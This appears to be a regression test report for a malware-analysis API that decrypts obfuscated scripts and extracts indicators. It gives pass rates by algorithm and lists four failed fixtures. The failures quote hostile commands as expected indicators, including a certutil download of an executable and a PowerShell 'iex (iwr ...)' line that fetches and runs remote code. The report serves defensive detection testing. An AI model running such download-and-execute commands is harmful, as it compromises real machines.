# RC4.1 · Crypto Golden Regression Evidence

- **API**: `http://localhost:8001`
- **Total fixtures**: 100
- **Passed**: 96 (96.0%)
- **Failed**: 4
- **False positives**: 1
- **False negatives**: 0
- **Duration**: 69s
- **Algorithms covered**: 28

## By algorithm

| Algorithm | Pass | Fail | Rate |
| --- | --- | --- | --- |
| `3DES` | 2 | 0 | 100% |
| `AES-CBC` | 11 | 0 | 100% |
| `AES-GCM` | 5 | 0 | 100% |
| `Base64+GZip+AES-CBC (C2 key)` | 4 | 0 | 100% |
| `Base64+RC4` | 3 | 0 | 100% |
| `ChaCha20-Poly1305` | 3 | 0 | 100% |
| `Compress-Archive` | 1 | 0 | 100% |
| `CustomHex+RC4` | 2 | 0 | 100% |
| `DES` | 2 | 0 | 100% |
| `GPG-asymmetric` | 1 | 0 | 100% |
| `GPG-symmetric` | 3 | 0 | 100% |
| `Get-Process` | 1 | 0 | 100% |
| `Hex+XOR-multi` | 2 | 1 | 66% |
| `Key-generation` | 1 | 0 | 100% |
| `OpenSSL:3DES` | 1 | 0 | 100% |
| `OpenSSL:AES-CBC` | 3 | 0 | 100% |
| `OpenSSL:ChaCha20` | 1 | 0 | 100% |
| `OpenSSL:RC4` | 1 | 0 | 100% |
| `RC4` | 5 | 0 | 100% |
| `RC4+DPAPI` | 3 | 0 | 100% |
| `RijndaelManaged` | 4 | 0 | 100% |
| `XOR-multi` | 30 | 0 | 100% |
| `XOR-single` | 3 | 2 | 60% |
| `certutil-encode` | 1 | 0 | 100% |
| `defender-config` | 1 | 0 | 100% |
| `net-user-add` | 1 | 0 | 100% |
| `robocopy` | 1 | 0 | 100% |
| `schtasks-benign` | 0 | 1 | 0% |

## Failures

- **xor-single-0** [XOR-single] — missing-iocs ['http://c2.io/beacon']
- **xor-single-2** [XOR-single] — missing-iocs ['certutil -urlcache -f http://m.io/x.exe %tmp%\\x.exe']
- **hex-xor-multi-0** [Hex+XOR-multi] — missing-iocs ['iex (iwr http://c2/x.ps1)']
- **benign-admin-8** [schtasks-benign] — verdict-malicious-expected-benign